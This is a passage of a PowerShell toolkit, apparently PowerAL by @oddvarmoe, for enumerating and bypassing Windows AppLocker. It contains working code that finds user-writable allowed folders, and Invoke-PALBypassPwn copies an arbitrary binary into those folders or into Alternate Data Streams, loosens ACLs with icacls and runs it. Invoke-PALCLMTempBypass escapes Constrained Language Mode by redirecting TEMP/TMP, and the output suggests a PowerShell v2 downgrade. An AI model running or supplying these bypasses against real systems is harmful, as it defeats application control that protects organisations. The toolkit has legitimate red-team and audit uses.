                    if($Add)
                    {
                        $FinaleArray += $PathObj
                    }
                }
                return $FinaleArray
            }
            else
            {
                #No deny rules - return patharray instead
                if($PathArray)
                {
                    return $PathArray
                }
                else
                {
                    Write-Verbose "No possible paths found - returning null"
                    return $null
                }
            }
        }
        Catch
        {
            write-error $_
        }
        Finally{}
    }
}

function Get-PALWriteablePaths
{
<#
.SYNOPSIS

Lists paths that are writeable for the current user.
This function can be noisy since it creates a temporary file in every directory to verify write access.
It will only test for folders and will not list files with modify rights that are present on the system.

Author: @oddvarmoe
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: ICACLS.exe

.DESCRIPTION

Checks the path and all subdirs for writeable access by creating a temporary file to the dir and deleting it.
Outputs: Path

.EXAMPLE

PS C:\> Get-PALWriteablepaths -Path "C:\windows"

C:\windows\Tasks
C:\windows\Temp
C:\windows\tracing
C:\windows\Registration\CRMLog
C:\windows\System32\FxsTmp
C:\windows\System32\Tasks
C:\windows\System32\com\dmp
C:\windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\windows\System32\spool\PRINTERS
C:\windows\System32\spool\SERVERS
C:\windows\System32\spool\drivers\color
C:\windows\SysWOW64\FxsTmp
C:\windows\SysWOW64\Tasks
C:\windows\SysWOW64\com\dmp
#>

# Function Version: 1.00
  
    [CmdletBinding()] Param(
        [Parameter(Mandatory=$true)]
        [String]
        $Path,

        [Switch]
        $Rerun
    )
    begin
    {
        if($Rerun)
        {
            Write-Verbose "Rerun specified, setting global arrays to null"
            $ScannedPaths = $null
            $WriteablePaths = $null
        }
        
        
    }

    Process
    {
        #To keep array intact if they contain data
        if($scannedPaths -eq $null)
        {
            $Global:ScannedPaths = @()
        }

        if($writeablepaths -eq $null)
        {
            $Global:WriteablePaths = @()
        }

        [Bool]$Match = $false
        foreach($sp in $Global:scannedPaths)
        {
            if($Path.ToLower() -like "*$($sp.ToLower())*")
            {
                $Match = $true
            }
        }

        if($Match)
        {
            Write-Verbose "Path already scanned"
            return $Global:writeablepaths
        }
        else
        {
            # Add the path to scanned path list
            $Global:ScannedPaths += $path

            [string]$tempname = "$(Get-Random).txt"

            $AllPaths = (Get-ChildItem $($path) -directory -Recurse -force -ErrorAction SilentlyContinue).FullName

            $ProgressTotal = $AllPaths.count
            $i = 0
            [int]$interval = $ProgressTotal * 0.1
            foreach($pth in $AllPaths){
                #write-verbose "-- $pth\$tempname --"
                try{
                    # Update progress less often
                    if ($i % $interval -eq 0) 
                    {
                      Write-Progress -Activity 'Checking for writeable folders' -Status "Checking subfolders for $path - $i of $ProgressTotal" -PercentComplete (($i/$ProgressTotal)*100)
                    }
                    $i++

                    New-Item -Path $pth -Name $tempname -ItemType File -ErrorAction Stop | Out-Null
                    #New-Item -Path $pth -Name $tempname -ItemType Directory -ErrorAction Stop | Out-Null
                    Write-verbose "Created file: $pth\$tempname"
                    $Global:writeablepaths += $pth
                    
                }
                catch{
                    #Write-verbose "Not able to create file: $pth\$tempname"
                    $ErrorMessage = $_
                    Write-Debug $ErrorMessage
                }
                Finally{

                }

                #Cleanup - delete the temporary file
                Remove-Item -Path $pth"\"$tempname -ErrorAction SilentlyContinue | Out-Null
                if(test-path $pth"\"$tempname){
                    Write-Verbose "File not deleted: $pth\$tempname"
                    Write-verbose "Adjusting ACLs on $pth\$tempname"
                    icacls $pth"\"$tempname /grant "BUILTIN\Users:(F)" | Out-Null
                    Write-Verbose "Trying to delete again: $path\$tempname"
                    Remove-Item -Path $pth"\"$tempname -ErrorAction SilentlyContinue | Out-Null
                    if(test-path $pth"\"$tempname)
                    {
                        Write-Error "File not deleted: $pth\$tempname"
                    }
                    else
                    {
                        Write-Verbose "Successfully deleted: $pth\$tempname"
                    }
                }
                else
                {
                }
            }

            return $Global:writeablepaths
        }
    }
}


function Invoke-PALAllInfo
{
<#
.SYNOPSIS

Runs all information checks to display current status of AppLocker on the local machine.

Author: @oddvarmoe
License: BSD 3-Clause
Required Dependencies: Get-PALRuleSectionStatus,Get-PALServiceStatus,Get-PALRules
Optional Dependencies: None

.DESCRIPTION

Checks AppLocker Rules status (Auditing,Enforced,NotConfigured), Service status (started,stopped,starttype) and show the AppLocker Rules

.EXAMPLE

PS C:\> Invoke-PALAllInfo

[*] Running Invoke-PALAllInfo


[*] Checking AppLocker Rule status

AppxStatus   : Enforced
DllStatus    : Not configured
ExeStatus    : Enforced
MsiStatus    : Auditing
ScriptStatus : Not configured


[*] Checking AppLocker Service status

Name      : AppIDSvc
Status    : Stopped
StartType : Manual


[*] Getting AppLocker rules

Name      : Appx
RulesList : {@{Ruletype=FilePublisherRule; Action=Allow; SID=S-1-1-0; Description=Allows members of the Everyone group to run packaged apps that are 
            signed.; Name=(Default Rule) All signed packaged apps; Id=a9e18c21-ff8f-43cf-b9fc-db40eed693ba; PublisherName=*; Productname=*; 
            BinaryName=*; LowSection=0.0.0.0; HighSection=*}}

Name      : Exe
RulesList : {@{Ruletype=FilePathRule; Action=Deny; SID=S-1-1-0; Description=; Name=%OSDRIVE%\inetpub; Id=16d974b5-279a-49a3-92c3-42b91050e42c; 
            Path=%OSDRIVE%\inetpub}, @{Ruletype=FilePathRule; Action=Deny; SID=S-1-1-0; Description=; Name=%WINDIR%\Microsoft.NET\*; 
            Id=179e155c-ffe5-4875-bf36-d2bd6eaaf9b9; Path=%WINDIR%\Microsoft.NET\*}, @{Ruletype=FilePublisherRule; Action=Deny; SID=S-1-1-0; 
            Description=; Name=CIPHER.EXE, in MICROSOFT® WINDOWS® OPERATING SYSTEM, from O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US; 
            Id=3bb28f6f-6fe5-44c0-bdca-8a4d102bc4af; PublisherName=O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US; Productname=MICROSOFT® 
            WINDOWS® OPERATING SYSTEM; BinaryName=CIPHER.EXE; LowSection=*; HighSection=*}, @{Ruletype=FilePathRule; Action=Allow; SID=S-1-1-0; 
            Description=; Name=c:\temp2\*; Id=3dc1888c-89fd-4018-808c-eb3fef906af3; Path=c:\temp2\*}...}

Name      : Msi
RulesList : {@{Ruletype=FilePathRule; Action=Allow; SID=S-1-1-0; Description=Allows members of the Everyone group to run all Windows Installer files 
            located in %systemdrive%\Windows\Installer.; Name=(Default Rule) All Windows Installer files in %systemdrive%\Windows\Installer; 
            Id=5b290184-345a-4453-b184-45305f6d9a54; Path=%WINDIR%\Installer\*}, @{Ruletype=FilePathRule; Action=Allow; SID=S-1-5-32-544; 
            Description=Allows members of the local Administrators group to run all Windows Installer files.; Name=(Default Rule) All Windows 
            Installer files; Id=64ad46ff-0d71-4fa0-a30b-3f3d30c5433d; Path=*.*}, @{Ruletype=FilePublisherRule; Action=Allow; SID=S-1-1-0; 
            Description=Allows members of the Everyone group to run digitally signed Windows Installer files.; Name=(Default Rule) All digitally 
            signed Windows Installer files; Id=b7af7102-efde-4369-8a89-7a6a392d1473; PublisherName=*; Productname=*; BinaryName=*; 
            LowSection=0.0.0.0; HighSection=*}}
#>

# Function Version: 1.00
    
    [CmdletBinding()] Param ()
    Process
    {
        Try
        {
            "`n[*] Running Invoke-PALAllInfo"
            
            "`n`n[*] Checking AppLocker Rule status"
            $Result = Get-PALRuleSectionStatus
            $Result | Format-List

            "`n`n[*] Checking AppLocker Service status"
            $Result = Get-PALServiceStatus
            $Result | Format-List

            "`n`n[*] Getting AppLocker rules"
            $Result = Get-PALRules
            $Result | Format-List
        }
        Catch
        {
            write-error $_
        }
        Finally{}
    }
}

function Invoke-PALBypassPwn
{
<#
.SYNOPSIS

Gets AppLocker rules that can be exploited and executes specified binary.

Author: @oddvarmoe
License: BSD 3-Clause
Required Dependencies: ICACLS.exe, Get-PALWriteableAllowedPaths
Optional Dependencies: None

.DESCRIPTION

Gets all allowed AppLocker Paths from Get-PalWriteableAllowedPaths and places the binary you want into
an allowed path and executes.

.PARAMETER BinaryFile

The binaryfile you want to execute. Needs to be the full path: C:\folder\file.exe

.PARAMETER Type
This specifies the type of file you are trying to execute. This can either be Exe or Dll. 
Dll is currently not added 100%.

.PARAMETER Bruteforce

When this switch is used the function will try all user writeable paths until it either 
runs out of paths or it is able to execute the binary specified.   

.PARAMETER ADS

When this switch is used the function will place the binary inside an Alternate Data Stream on the user writeable folder.

.EXAMPLE

PS C:\> Invoke-PALBypassPwn -BinaryFile C:\temp\ADExplorer.exe -Type Exe

[*] Running Invoke-AppLockerBypassPwn

[*] Trying to Pwn using modifiable paths that AppLocker allows
[*] Getting modifiable paths allowed by AppLocker Path rules - Be very patient!
[+] Got the following EXE paths that are modifiable

Name Path                                                
---- ----                                                
Exe  C:\Program Files (x86)\IBM\Client Access            
Exe  C:\Windows\System32\spool\PRINTERS                  
Exe  C:\Windows\System32\spool\SERVERS                   
Exe  C:\Windows\System32\spool\drivers\color             


[*] Picking random Path to try
[+] C:\Windows\System32\spool\drivers\color was choosen

[*] Picking random filename
[+] b09e1627-5c19-4526-8ea3-ae2b40f7810f.exe was choosen

[+] Copying binary file b09e1627-5c19-4526-8ea3-ae2b40f7810f.exe to C:\Windows\System32\spool\drivers\color

[+] Checking ACL on C:\Windows\System32\spool\drivers\color\b09e1627-5c19-4526-8ea3-ae2b40f7810f.exe
[+] ACL's all good on C:\Windows\System32\spool\drivers\color\b09e1627-5c19-4526-8ea3-ae2b40f7810f.exe
[+] Trying to start binary file b09e1627-5c19-4526-8ea3-ae2b40f7810f.exe
[+] Process launched - The world is ours!
[+] [Manual action needed] Remember to delete - C:\Windows\System32\spool\drivers\color\b09e1627-5c19-4526-8ea3-ae2b40f7810f.exe
[+] Command added to your clipboard
Remove-item "C:\Windows\System32\spool\drivers\color\b09e1627-5c19-4526-8ea3-ae2b40f7810f.exe"

.EXAMPLE

PS C:\> Invoke-PALBypassPwn -BinaryFile C:\temp\ADExplorer.exe -Type Exe -bruteforce -ADS

[*] Running Invoke-AppLockerBypassPwn

[*] Trying to Pwn using modifiable paths that AppLocker allows
[*] Getting modifiable paths allowed by AppLocker Path rules - Be very patient!
[+] Got the following EXE paths that are modifiable

Name Path                                                
---- ----                                                
Exe  C:\Windows\Tasks                                    
Exe  C:\Windows\tracing                                  
Exe  C:\Windows\System32\FxsTmp                          
Exe  C:\Windows\System32\Tasks                           

[+] Copying binary file 409d49b5-774a-46ff-abcd-5c166a6a9f73.exe to ADS in C:\Windows\Tasks
[+] Trying to start binary file C:\Windows\Tasks:409d49b5-774a-46ff-abcd-5c166a6a9f73.exe
                                                         
[-] Process failed to launched from C:\Windows\Tasks:409d49b5-774a-46ff-abcd-5c166a6a9f73.exe

[+] Copying binary file 3a8a14d0-eda9-44f6-b7c6-1e97aff3c8cf.exe to ADS in C:\Windows\tracing
[+] Trying to start binary file C:\Windows\tracing:3a8a14d0-eda9-44f6-b7c6-1e97aff3c8cf.exe
                                                         
[+] Process launched - The world is ours!
[-] You need to manually remove the binaries added to the streams
[+] List of commands
Remove-item "C:\Windows\Tasks" -stream 409d49b5-774a-46ff-abcd-5c166a6a9f73.exe
Remove-item "C:\Windows\tracing" -stream 3a8a14d0-eda9-44f6-b7c6-1e97aff3c8cf.exe

#>

# Function Version: 0.90

    [CmdletBinding()] Param (
        [parameter(Mandatory=$true)]
        [String]$BinaryFile,

        [ValidateSet("Exe","Dll")]
        [parameter(Mandatory=$true)]
        [String]$Type,

        [Switch]$BruteForce,

        [Switch]$ADS
    )
    Process
    {
        Try
        {
            "`n[*] Running Invoke-AppLockerBypassPwn"
            
            "`n[*] Trying to Pwn using modifiable paths that AppLocker allows"
            
            if($Type -eq "Exe")
            {
                "[*] Getting modifiable paths allowed by AppLocker Path rules - Be very patient!"
                #Needed because of bug with Global variables
                Get-PALWriteableAllowedPaths | Out-Null
                $AllowedPaths = Get-PALWriteableAllowedPaths -RuleSection Exe

                if($AllowedPaths)
                {
                    "[+] Got the following EXE paths that are modifiable"
                    $AllowedPaths

                    if($BruteForce)
                    {
                        $FilesLeftBehind = @()
                        foreach($Path in $AllowedPaths)
                        {
                            $RandomFileName = [System.Guid]::NewGuid().ToString()+".exe"
                            if($ADS)
                            {
                                "`n[+] Copying binary file $RandomFileName to ADS in $($Path.path)"
                                Get-Content $BinaryFile -Raw | set-content -path $Path.path -Stream $RandomFileName
                                Write-Verbose "$Path.path\:$randomfilename"
                                $CMDLine = "$($Path.path):$RandomFileName"
                                "[+] Trying to start binary file $CMDLine"
                                Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $CMDLine}

                                sleep 5
                                $ProcessActive = get-process | where{$_.path -eq $CMDLine} -ErrorAction SilentlyContinue
                                if($ProcessActive -eq $null)
                                {
                                    "[-] Process failed to launched from $CMDLine"
                                    $FilesLeftBehind += "Remove-item `"$($Path.Path)`" -stream $RandomFileName"
                                }
                                else
                                {
                                    "[+] Process launched - The world is ours!"
                                    "[-] You need to manually remove the binaries added to the streams"
                                    "[+] List of commands"
                                    $FilesLeftBehind += "Remove-item `"$($Path.Path)`" -stream $RandomFileName"
                                    $FilesLeftBehind
                                    break
                                }
                            }
                            else
                            {
                                # Bruteforce execution of file
                                "`n[+] Copying binary file $RandomFileName to $($Path.path)"
                                copy-item -Path $BinaryFile -Destination (join-path $($Path.Path) $RandomFileName)
                                #####"`n[+] Setting ACL using ICALCS giving Users full control of $RandomFileName"
                                #####icacls $pth"\"$tempname /grant "BUILTIN\Users:(F)" | Out-Null
                            
                                "[+] Trying to start binary file $RandomFileName"
                                Invoke-Expression "& '$(join-path $($Path.Path) $RandomFileName)'" -ErrorAction Stop
                            
                                #Check if process was launched
                                Sleep 5
                                
                                $ProcessActive = get-process | where{$_.path -eq $(join-path $Path.Path $RandomFileName)} -ErrorAction SilentlyContinue
                                if($ProcessActive -eq $null)
                                {
                                    "[-] Process failed to launched from (join-path $($Path.Path) $RandomFileName)"
                                    "[-] Removing copied binary: (join-path $($Path.Path) $RandomFileName)"
                                    remove-item (join-path $($Path.Path) $RandomFileName)
                                }
                                else
                                {
                                    "[+] Process launched - The world is ours!"
                                    "[+] [Manual action needed] Remember to delete - $(join-path $($Path.Path) $RandomFileName)"
                                    "Remove-item `"$(join-path $Path.Path $RandomFileName)`"" | clip
                                    "[+] Command added to your clipboard"
                                    "Remove-item `"$(join-path $($Path.Path) $RandomFileName)`""
                                    break
                                }
                            }
                        }
                    }
                    else # Only try one time and stop if it fails
                    {
                        $RandomPath = $AllowedPaths[(Get-Random -Minimum 0 -Maximum $AllowedPaths.Count)]
                        "`n[*] Picking random Path to try"
                        "[+] $($RandomPath.path) was choosen"
                        
                        $RandomFileName = [System.Guid]::NewGuid().ToString()+".exe"
                        "`n[*] Picking random filename"
                        "[+] $($RandomFilename) was choosen"
                        if($ADS)
                        {
                            "`n[+] Copying binary file $RandomFileName to ADS in $($RandomPath.path)"
                            Get-Content $BinaryFile -Raw | set-content -path $RandomPath.path -Stream $RandomFileName
                            Write-Verbose "$RandomPath.path\:$randomfilename"
                            $CMDLine = "$($RandomPath.path):$RandomFileName"
                            "[+] Trying to start binary file $CMDLine"
                            Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $CMDLine}

                            sleep 5
                            $ProcessActive = get-process | where{$_.path -eq $CMDLine} -ErrorAction SilentlyContinue
                            if($ProcessActive -eq $null)
                            {
                                "[-] Process failed to launched from $CMDLine"
                                "[-] You need to manually remove the binary: $CMDLine"
                                "Remove-item `"$($RandomPath.Path)`" -stream $RandomFileName" | clip
                                "[+] Command added to your clipboard"
                                "Remove-item `"$($RandomPath.Path)`" -stream $RandomFileName"
                                break
                            }
                            else
                            {
                                "[+] Process launched - The world is ours!"
                                "[-] You need to manually remove the binary: $CMDLine"
                                "Remove-item `"$($RandomPath.Path)`" -stream $RandomFileName" | clip
                                "[+] Command added to your clipboard"
                                "Remove-item `"$($RandomPath.Path)`" -stream $RandomFileName"
                                break
                            }
                        }
                        else
                        {
                            #Normal execution of file
                            "`n[+] Copying binary file $RandomFileName to $($RandomPath.Path)"
                            copy-item -Path $BinaryFile -Destination (join-path $($RandomPath.Path) $RandomFileName)
                            $JoinedPath = $($RandomPath.Path+"\"+$RandomFileName)
                            
                            $user = $env:USERNAME
                            "`n[+] Checking ACL on $JoinedPath"
                            if((get-acl -path $JoinedPath).AccessToString -match "Users.*Allow.*ReadAndExecute" -or (get-acl -path $JoinedPath).AccessToString -match "Users.*Allow.*FullControl" -or (get-acl -path $JoinedPath).AccessToString -match "$user.*Allow.*FullControl" -or (get-acl -path $JoinedPath).AccessToString -match "$user.*Allow.*ReadAndExecute")
                            {
                                "[+] ACL's all good on $JoinedPath"
                            }
                            else
                            {
                                "[+] Lackin correct ACL on $JoinedPath"
                                "[+] Setting ACL using ICALCS giving Users full control on $JoinedPath"
                                # Not possible to use Set-ACL in Constrained Language mode...Have to depend on ICACLS..that sux..
                                icacls $JoinedPath /grant "BUILTIN\Users:(F)" 
                                if($LASTEXITCODE -ne 0)
                                {
                                    "[-] Not able to change ACLs on file - Will stop execution and cleanup - Re-run function to give it another try or use the bruteforce to try until you are successfull"
                                    remove-item (join-path $RandomExePath.Path $RandomFileName)
                                    break
                                }
                            }

                            "[+] Trying to start binary file $RandomFileName"
                            invoke-expression "& '$(join-path $($RandomPath.Path) $RandomFileName)'" -ErrorAction Stop
                            
                            #Check if process was launched
                            Sleep 5
                            $ProcessActive = get-process | where{$_.path -eq $(join-path $($RandomPath.Path) $RandomFileName)} -ErrorAction SilentlyContinue
                            if($ProcessActive -eq $null)
                            {
                                "[-] Process failed to launched from $(join-path $($RandomPath.Path) $RandomFileName)"
                                "[-] Remving copied binary: $(join-path $($RandomPath.Path) $RandomFileName)"
                                remove-item $(join-path $($RandomPath.Path) $RandomFileName)
                            }
                            else
                            {
                                "[+] Process launched - The world is ours!"
                                "[+] [Manual action needed] Remember to delete - $(join-path $($RandomPath.Path) $RandomFileName)"
                                "Remove-item `"$(join-path $($RandomPath.Path) $RandomFileName)`"" | clip
                                "[+] Command added to your clipboard"
                                "Remove-item `"$(join-path $($RandomPath.Path) $RandomFileName)`""
                                break
                            }
                        }
                    }
                }
                else
                {
                    "[-] Got none EXE paths that are writable :-("
                }
            }

            if($Type -eq "Dll")
            {
                Write-error "Not implemented yet"
                break
            }
        }
        Catch
        {
            write-error $_
        }
        Finally{}
    }
}

#Requires -Modules CimCmdlets
Function Invoke-PALCLMTempBypass
{
<#
.SYNOPSIS

The function figures out allowed Script paths, injects that path to the temp and tmp variable in a new Powershell console.
This results in a Full Language Mode Powershell console.

Author: @oddvarmoe
License: BSD 3-Clause
Required Dependencies: Get-PALWriteableAllowedPaths
Optional Dependencies: None

.DESCRIPTION

Calling function without parameters will make it get all the AppLocker rules for 
the scripts rule section and figure out if there is a writable path for the user. 
The script will then pick a random writable path and spawn a new Powershell window
pointing %temp% and %tmp% to that location. 

If you specify $AllowedPath it will not enumerate the rules and figure out writable
locations. Instead it will try to spawn Powershell with the %temp% and %tmp% pointing to
that location.

Use $ExecutionContext.SessionState.LanguageMode to check language mode

.PARAMETER AllowedPath

Instead of enumerating you can supply a path to a location where you know that execution of scripts is allowed and the user has write access to. 

.PARAMETER PoshStartParms

Specify if you want to add parameters to the powershell.exe that will be spawned. 
You need to start with a space. Ex -PoshStartParms " -file c:\temp\file.ps1"

.EXAMPLE

Spawns a new Powershell window if it figures out a valid path

PS C:\> Invoke-PALCLMTempBypass

[*] Finding suitable script rule location

[*] Starting full language mode Powershell

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     4000           0               

.EXAMPLE

PS C:\> Invoke-PALCLMTempBypass -AllowedPath C:\windows\Tasks\

[*] Path specified - Trying bypass from that path

[*] Starting full language mode Powershell

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     6092           0
#>

# Function Version: 1.0

[CmdletBinding()] Param (
        [String]
        $AllowedPath,

        [String]
        $PoshStartParms
    )
    Process
    {
        Try
        {
            $InjectiblePaths = @()

            if($AllowedPath)
            {
                "`n[*] Path specified - Trying bypass from that path"
                $InjectiblePaths += $AllowedPath
            }
            else
            {
                "`n[*] Finding suitable script rule location - Be patient - Takes time the first time you run it per session, since it calculates all writable paths!"
                #A bug... Needs to run it once before I can use rulesection and get the correct count
                #must be something related to global variables
                Get-PALWriteableAllowedPaths | Out-Null
                $InjectiblePaths += Get-PALWriteableAllowedPaths -RuleSection Script
            }

            if($InjectiblePaths)
            {
                $RandomScriptAllowedPath = $InjectiblePaths[(Get-Random -Minimum 0 -Maximum $InjectiblePaths.Count)]
                "`[*] Found $($InjectiblePaths.count) paths"
                "`[*] Random path picked: $($RandomScriptAllowedPath.Path)"
                "`[*] Launching Powershell with TEMP/TMP set to: $($RandomScriptAllowedPath.Path)"
                $TEMPBypassPath = $RandomScriptAllowedPath
                $TMPBypassPath = $RandomScriptAllowedPath
                
                #Borrowed code from Matt Graeber (Thanks! You rock! #KeepMattHappy)
                #https://gist.githubusercontent.com/mattifestation/9d09822e94fc901559280d700101f14e/raw/0128bf47f1f761a9fd254d1bf268579ff2a15685/RunscripthelperBypass.ps1 
                $CMDLine = "$PSHOME\powershell.exe"
                
                If($PoshStartParms){
                    $CMDLine += $PoshStartParms
                }

                [String[]] $EnvVarsExceptTemp = Get-ChildItem Env:\* -Exclude "TEMP","TMP"| % { "$($_.Name)=$($_.Value)" }
                $TEMPBypassPath = "Temp=$($RandomScriptAllowedPath.Path)"
                $TMPBypassPath = "TMP=$($RandomScriptAllowedPath.Path)"
                $EnvVarsExceptTemp += $TEMPBypassPath
                $EnvVarsExceptTemp += $TMPBypassPath
                
                $StartParamProperties = @{ EnvironmentVariables = $EnvVarsExceptTemp }
                $StartParams = New-CimInstance -ClassName Win32_ProcessStartup -ClientOnly -Property $StartParamProperties

                "`n[*] Starting full language mode Powershell"
                Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{
                    CommandLine = $CMDLine
                    ProcessStartupInformation = $StartParams
                }
            }
            else
            {
                Write-Verbose "No path found, bypass not possible :-("
            }
        }
        Catch
        {
            write-error $_
        }
        Finally{}
    }
}


function Invoke-PALExploitableRules
{
<#
.SYNOPSIS

Gets AppLocker rules that potentially can be exploited.

Author: @oddvarmoe
License: BSD 3-Clause
Required Dependencies: Get-PALRules, Get-PALRulesStatus, Get-PALWriteableAllowedPaths
Optional Dependencies: None

.DESCRIPTION

Checking AppLocker rules and looks for known weaknesses in configuration that can be exploited.

.EXAMPLE

PS C:\> Get-PALExploitableRules

[*] Checking for Exploitable AppLocker rules - be patient
    #######################
    #GENERAL CONFIGURATION#
    #######################

[*] Checking rule collection status
[+] Appx is not enforced. Have fun!
[+] Dll is not enforced. Have fun!

[*] Checking PowerShell version 2 status
[+] Powershell version 2 is enabled
[+] Start Powershell with command: powershell -version 2

    #######################
    # PUBLISHER RULES     #
    #######################
[+] Found * Publisher Rules that can potentially be exploited:

ParentName PublisherName Productname BinaryName
---------- ------------- ----------- ----------
Appx       *             *           *         
Msi        *             *           *         



    #######################
    # PATH RULES          #
    #######################
[*] Checking for missing ADS rules
[+] These writeable allowed paths does not block ADS and can be exploited:

Name   Path                                                
----   ----                                                
Exe    C:\Windows\Registration\CRMLog                      
Exe    C:\Windows\System32\FxsTmp                          
Exe    C:\Windows\System32\com\dmp                         
Exe    C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
Exe    C:\Windows\SysWOW64\FxsTmp                          
Exe    C:\Windows\SysWOW64\Tasks                           
Exe    C:\Windows\SysWOW64\com\dmp                         
Script C:\Windows\Tasks                                    
Script C:\Windows\Temp                                     
Script C:\Windows\tracing                                  
Script C:\Windows\System32\FxsTmp                          
Script C:\Windows\System32\Tasks                           
Script C:\Windows\System32\com\dmp                         
Script C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys


[*] Checking if there are exploitable allowed path rules that user can write to

[*] Checking for missing files and folders that has allow rules
[+] Missing allowed paths found that can potentially be exploited:

Name   Path                                                                                                                      
----   ----                                                                                                                      
Exe    C:\WINLINK\WINLINK.EXE                                                                                                 
Exe    C:\USERS\*\APPDATA\LOCAL\CITRIX\ICA CLIENT\WFICA32.EXE                                                                    
Exe    C:\SOFTWARE32\IMPORT.exe
Exe    C:\USERS\*\APPDATA\LOCAL\CITRIX\ICA CLIENT\RECEIVER\RECEIVER.EXE                                                          
Script C:\USERS\PUBLIC\DESKTOP\SAPSTART.BAT                                                                              
Script C:\Software32\SHIP.BAT                                                                                        

[*] Checking for potential CLM bypass
[+] 14 potential paths found that can be used for CLM bypass
[+] Use Invoke-PALCLMTempBypass to attempt to launch a full language mode PowerShell session
Script C:\Windows\Tasks                                                                                                          
Script C:\Windows\Temp                                                                                                           
Script C:\Windows\tracing                                                                                                        
Script C:\Windows\Registration\CRMLog                                                                                            
Script C:\Windows\System32\FxsTmp                                                                                                
Script C:\Windows\System32\Tasks                                                                                                 
Script C:\Windows\System32\com\dmp                                                                                               
Script C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys                                                                      
Script C:\Windows\System32\spool\PRINTERS                                                                                        
Script C:\Windows\System32\spool\SERVERS                                                                                         
Script C:\Windows\System32\spool\drivers\color                                                                                   
Script C:\Windows\SysWOW64\FxsTmp                                                                                                
Script C:\Windows\SysWOW64\Tasks                                                                                                 
Script C:\Windows\SysWOW64\com\dmp                                                                                               

    #######################
    # HASH RULES          #
    #######################
[-] Did not find any hash deny rules
#>
# Function Version: 0.96    
    [CmdletBinding()] Param (
        [String]$OfflineXML
    )
    Process
    {
        Try
        {
            
            If($OfflineXML)
            {
                "`n[*] Checking for Exploitable AppLocker rules from Offline XML"
                $PublisherRules = Get-PALRulesNative -OutputRules Publisher -RuleActions Allow -OfflineXML $OfflineXML
                $DenyPathRules = Get-PALRulesNative -OutputRules Path -RuleActions Deny -OfflineXML $OfflineXML
                $DenyHashRules = Get-PALRulesNative -OutputRules Hash -RuleActions Deny -OfflineXML $OfflineXML
                $AllowPathRules = Get-PALRulesNative -OutputRules Path -RuleActions Allow -OfflineXML $OfflineXML
            }
            else
            {
                "`n[*] Checking for Exploitable AppLocker rules - be patient"
                $PublisherRules = Get-PALRules -OutputRules Publisher -RuleActions Allow
                $DenyPathRules = Get-PALRules -OutputRules Path -RuleActions Deny -ExceptionsAsDeny
                $DenyHashRules = Get-PALRules -OutputRules Hash -RuleActions Deny
                $AllowPathRules = Get-PALRules -OutputRules Path -RuleActions Allow
                #Need this due to a bug
                Get-PALWriteableAllowedPaths | Out-Null
            }

            #Check if some of the rule collections is not configured
            "    #######################"
            "    #GENERAL CONFIGURATION#"
            "    #######################"
            "`n[*] Checking rule collection status"
            $RulesStatus = Get-PALRuleSectionStatus
            foreach($Ruless in $RulesStatus)
            {
                if($Ruless.status -ne "Enforced")
                {
                    "[+] $($Ruless.Name) is not enforced. Have fun!"
                }
            }

            #Check if Powershell v2 is allowed or not!
            "`n[*] Checking PowerShell version 2 status"
            $Posh2Enabled = Get-PALPoshV2Installed
            if($Posh2Enabled -eq "True")
            {
                "[+] Powershell version 2 is enabled"
                "[+] Start Powershell with command: powershell -version 2"
            }
            else
            {
                "[-] Found that Powershell version 2 is disabled"
            }
            


            $ExploitablePublisherRules = @()
            "`n    #######################"
            "    # PUBLISHER RULES     #"
            "    #######################"
            
            ## All signed binaries rule
            if($PublisherRules)
            {
                ForEach($PubSection in $PublisherRules)
                {
                    Foreach($PubRule in $PubSection.RulesList)
                    {
                        if($PubRule.Publishername -eq "*")
                        {
                            write-verbose "[+] Trust all signed rule found in $($pubSection.name)"
                            write-verbose "[+] Get yourself a code signing cert and start a party!"
                            $ExploitablePublisherRules += $PubRule
                        }
                    }
                }

                if($ExploitablePublisherRules)
                {
                    "[+] Found * Publisher Rules that can potentially be exploited:"
                    $ExploitablePublisherRules | Select-Object ParentName,PublisherName,ProductName,BinaryName | format-table
                }
                else
                {
                    "[-] No * Publisher Rules found"
                }
            }

            
            "`n    #######################"
            "    # PATH RULES          #"
            "    #######################"
            "[*] Checking for user writeable allowed paths"
            $UserAllowedWriteablePaths = Get-PALWriteableAllowedPaths
            if($UserAllowedWriteablePaths)
            {
                "[+] These userwriteable allowed paths was found:"
                $UserAllowedWriteablePaths
            }
            else
            {
                "[-] No userwriteable allowed paths was found"
            }

            "`n[*] Checking for missing ADS rules"
            ## ADS
            $MissingADSPaths = Get-PALMissingADSRules
            if($MissingADSPaths)
            {
                "[+] The following userwriteable allowed paths are missing ADS blocking rules:"
                $MissingADSPaths
            }
            else
            {
                "[-] All userwriteable allowed paths have ADS blocking rules"
            }
            
                        
            ## Deny rules that are configured wrong
            if($DenyPathRules)
            {
                $ExploitableDenyPathRules = @()

                ForEach($DPR in $DenyPathRules.RulesList)
                {
                    if(!($($DPR.RulePath) -match "\\\*$" -or $($DPR.RulePath) -match "\.\w{2,4}$" -or $($DPR.RulePath) -match ":\*"))
                    {
                        write-verbose "[+] Found misconfigured deny path rule - Missing asterix (*) - Rule has no effect"
                        $ExploitableDenyPathRules += $DPR
                    }
                }

                if($ExploitableDenyPathRules)
                {
                    "[+] Misconfigured deny rules - Missing asterix (*) - Rule has no effect:"
                    $ExploitableDenyPathRules | Select-Object ParentName,RulePath | Format-Table
                }
            }
            else{
                "[+] Did not find any specific deny rules"
            }

            #Rules that allow path for a single filename
            # *file.exe and *file.exe*
            "`n[*] Checking for *file.exe and *file.exe* allowed path rules"

            $ExploitableAllowedPathRules = @()
            foreach($section in $AllowPathRules)
            {
                foreach($sect in $section.RulesList)
                {   #*file.exe*" or "*file.exe"
                    if($sect.path -match "^\*\w+\.\w{2,4}\*$" -or $sect.path -match "^\*\w+\.\w{2,4}$")
                    {
                        write-verbose "[+] Found exploitable allowed path rule in section: $($sect.ParentName)"
                        $ExploitableAllowedPathRules += $sect
                    }
